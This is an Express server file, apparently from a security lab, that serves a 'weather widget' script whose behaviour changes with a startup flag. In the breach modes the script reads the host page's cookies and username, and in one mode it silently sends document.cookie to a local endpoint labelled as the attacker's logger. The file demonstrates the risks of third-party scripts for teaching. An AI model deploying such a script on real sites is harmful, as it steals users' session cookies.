// WeatherApp - weather widget (http://localhost:5000)
// weather.js behavior controlled by startup flag:
//   node server.js                -> normal mode (logs temperature)
//   node server.js --mode breach1 -> alert with cookie + username
//   node server.js --mode breach2 -> silent exfiltration via fetch to /log

const express = require('express');
const path = require('path');

const app = express();
const PORT = 5000;

const mode = process.argv.includes('--mode')
  ? process.argv[process.argv.indexOf('--mode') + 1]
  : 'normal';

console.log('[System] Starting WeatherApp v1.0.0...');
console.log(`[System] weather widget mode: "${mode}"`);

// attacker endpoint: logs whatever data is exfiltrated to it
app.get('/log', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  console.log('[ATTACKER] stolen data:', req.query.data);
  res.send('ok');
});

// weather.js served dynamically; content depends on mode
app.get('/weather.js', (req, res) => {
  res.type('application/javascript');

  if (mode === 'breach1') {
    // runs in the port-3000 page context -> full access to its cookie and DOM
    res.send(
      `console.log('[weather] BREACH1: reading host page data');\n` +
      `alert("HACKED: I can see your cookies: " + document.cookie + ` +
      `" and User: " + document.getElementById('username').innerText);\n`
    );
  } else if (mode === 'breach2') {
    // silent theft: send the cookie to the attacker's server
    res.send(
      `const stolenCookie = document.cookie;\n` +
      `fetch("http://localhost:5000/log?data=" + encodeURIComponent(stolenCookie));\n` +
      `console.log("Cookie successfully sent to Attacker Server!");\n`
    );
  } else {
    res.send(
      `console.log('[weather] Current temperature: +14°C, cloudy (Port 5000)');\n`
    );
  }
});

// serve static files from public/ (including weather-promo.html for Lab 7)
app.use(express.static(path.join(__dirname, 'public')));

app.listen(PORT, () => {
  console.log(`[System] WeatherApp listening on http://localhost:${PORT}`);
});
